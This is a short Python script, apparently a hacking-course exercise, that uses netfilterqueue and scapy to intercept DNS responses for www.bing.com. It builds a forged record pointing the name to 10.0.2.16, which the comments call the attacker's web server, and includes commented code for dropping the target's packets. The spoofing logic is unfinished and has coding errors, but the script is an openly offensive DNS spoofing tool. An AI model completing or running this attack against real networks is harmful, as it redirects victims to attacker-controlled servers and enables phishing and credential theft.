#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    # Prints packet payload
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.hasLayer(scapy.DNSRR):
        print(scapy_packet.show())
        if scapy_packet[scapy.DNSQR].qname:
            qname = scapy_packet[scapy.DNSQR].qname
            if "www.bing.com" in qname:
                print("[+] Spoofing Target")
                # rrname tells person that they're at the right sight
                # rdata is ip of Attacker web server
                answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
                print(answer)
    # Drops the packet... cuts connection of target client
    # packet.drop()
    # Intercept incoming packets and accept them instead of dropping them
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()